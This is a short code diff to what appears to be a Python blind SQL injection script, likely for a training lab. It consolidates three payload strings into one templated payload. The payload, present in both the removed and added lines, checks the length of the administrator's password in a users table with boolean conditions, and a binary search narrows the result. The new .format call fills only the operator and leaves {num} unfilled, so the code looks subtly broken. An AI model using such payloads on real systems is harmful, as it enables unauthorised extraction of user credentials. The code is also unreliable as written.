@@ -31,10 +31,8 @@ def encodePayload(payload):
 
 
 def binarySearch(array , num , low , high):
-
-    LowPyload = " 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a"
-    HighPyload = " 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)<{num})='a"
-    EquelPyload = " 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={num})='a"
+    
+    BinarySearchPayload = " 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){operator}{num})='a".format(operator="=")
 
     # Repeat until the pointers low and high meet each other
     while low <= high:
